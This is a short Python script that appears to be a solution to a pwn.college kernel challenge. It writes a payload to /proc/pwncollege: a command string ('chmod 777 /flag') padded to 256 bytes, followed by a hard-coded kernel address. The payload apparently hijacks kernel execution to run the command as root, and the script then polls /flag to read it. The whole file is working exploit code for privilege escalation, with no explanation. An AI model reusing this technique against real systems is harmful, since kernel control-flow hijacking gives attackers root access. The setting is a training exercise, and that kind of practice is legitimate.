import struct
from time import sleep

addr = struct.pack("<Q", 0xffffffff81089b30)
print(addr.hex())

cmd = b"/usr/bin/chmod 777 /flag"
padding = b"\0"*((0x100)-len(cmd))
shellcode = cmd + padding + addr

with open('/proc/pwncollege', 'wb') as f:
    f.write(shellcode)

for i in range(5):
    try:
        with open('/flag', 'r') as f:
            print(f.read())
        exit()
    except PermissionError: 
        sleep(1)

